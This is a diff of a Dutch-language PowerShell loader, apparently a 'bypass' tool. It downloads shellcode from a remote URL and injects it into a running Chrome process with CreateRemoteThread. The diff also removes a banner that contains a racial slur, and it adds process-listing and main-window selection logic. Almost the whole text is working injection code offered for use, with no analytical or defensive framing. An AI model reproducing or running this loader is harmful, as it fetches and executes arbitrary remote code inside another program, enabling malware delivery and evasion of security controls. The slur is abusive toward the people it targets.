@@ -4,27 +4,16 @@ if (-not [Environment]::Is64BitProcess) {
     pause
     exit
 }
-function Show-Banner {
-    Clear-Host
-    Write-Host ""
-    Write-Host "  ╔══════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "  ║                                      ║" -ForegroundColor Cyan
-    Write-Host "  ║       NIGGER BYPASS  v6.7            ║" -ForegroundColor Yellow
-    Write-Host "  ║       Gemaakt door: MJBP <3          ║" -ForegroundColor White
-    Write-Host "  ║                                      ║" -ForegroundColor Cyan
-    Write-Host "  ╚══════════════════════════════════════╝" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host ""
-    Write-Host ""
-    Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan
-    }
-    
-Show-Banner
+
+Write-Host "---GEMAAKT DOOR MJBP---" -ForegroundColor Cyan
+Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan
+
 $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
+
 if (-not $edgeProcesses) {
     Write-Host "[*] Chrome niet gevonden, wordt gestart..." -ForegroundColor Yellow
     Start-Process "chrome"
-    Start-Sleep 2
+    Start-Sleep 6
     $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
 }
 
@@ -34,17 +23,32 @@ if (-not $edgeProcesses) {
     exit
 }
 
+# ==================== LIJST VAN ALLE CHROME PROCESSEN ====================
+Write-Host "`n[+] Alle Chrome processen gevonden:" -ForegroundColor Cyan
+Write-Host "-------------------------------------------------------------" -ForegroundColor DarkGray
+
+$edgeProcesses | Sort-Object WorkingSet64 -Descending | ForEach-Object {
+    $memMB = [math]::Round($_.WorkingSet64 / 1MB, 1)
+    $status = if ($_.MainWindowTitle) { " (Hoofdvenster)" } else { "" }
+    Write-Host "   PID: $($_.Id)  |  Geheugen: $memMB MB$status" -ForegroundColor White
+}
+
+Write-Host "-------------------------------------------------------------`n" -ForegroundColor DarkGray
+
+# ==================== HOOFdVENSTER SELECTEREN ====================
 $targetProcess = $edgeProcesses | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
 
 if (-not $targetProcess) {
-    Write-Host "[-] Hoofdvenster niet gevonden" -ForegroundColor Yellow
+    Write-Host "[-] Hoofdvenster niet gevonden! Valt terug op laagste memory proces." -ForegroundColor Yellow
     $targetProcess = $edgeProcesses | Sort-Object WorkingSet64 -Ascending | Select-Object -First 1
 }
 
 $targetPID = $targetProcess.Id
 $memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)
 
-Write-Host "[+] PID: $targetPID" -ForegroundColor Green
+Write-Host "[+] Hoofdvenster gekozen!" -ForegroundColor Green
+Write-Host "[+] PID: $targetPID  |  Geheugen: $memoryMB MB (Hoofdvenster)" -ForegroundColor Green
+Write-Host ""
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
@@ -54,7 +58,7 @@ try {
     pause
     exit
 }
-Write-Host "-----------------------------------------------"
+
 $size = $shellcode.Length
 
 Add-Type -MemberDefinition @"
@@ -89,11 +93,9 @@ try {
 
     $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null)
     if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread mislukt" }
-    Write-Host "-----------------------------------------------"
-    Write-Host "[+] Injectie succesvol - Je kan deze CMD nu sluitem!" -ForegroundColor Green
-    Write-Host "[x] Cleanen = END klikken of chrome sluiten" -ForegroundColor Yellow
-    Write-Host "[!] LAAT CHROME OPEN STAAN!" -ForegroundColor Red
-    Write-Host "#CLEAN" -ForegroundColor Cyan
+
+    Write-Host "[+] Injectie succesvol in Hoofdvenster (PID $targetPID)!" -ForegroundColor Green
+    Write-Host "[+] LAAT DIT CHROME VENSTER OPEN STAAN!" -ForegroundColor Red
 } catch {
     Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
 } finally {
